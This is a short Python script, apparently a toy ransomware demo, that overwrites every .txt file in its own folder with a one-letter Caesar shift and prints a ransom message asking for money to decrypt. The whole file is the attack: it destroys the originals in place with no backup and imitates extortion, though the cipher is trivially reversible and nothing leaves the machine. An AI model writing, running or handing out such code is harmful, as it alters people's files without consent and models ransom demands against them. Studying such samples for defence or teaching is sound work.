import os

current_directory = os.path.dirname(os.path.abspath(__file__))

for filename in os.listdir(current_directory):
    if filename.endswith(".txt"):
        filepath = os.path.join(current_directory, filename)
        
        with open(filepath, "r") as file:
            content = file.read()
        
        encrypted_content = ""
        for char in content:
            if char.isalpha():
                if char.islower():
                    new_char = chr(((ord(char) - ord('a') + 1) % 26) + ord('a'))
                else:
                    new_char = chr(((ord(char) - ord('A') + 1) % 26) + ord('A'))
                encrypted_content += new_char
            else:
                encrypted_content += char
        
        with open(filepath, "w") as file:
            file.write(encrypted_content)
        
        print(f" oops! File :{filename} has been encrypted! Please send money to Decrypt!")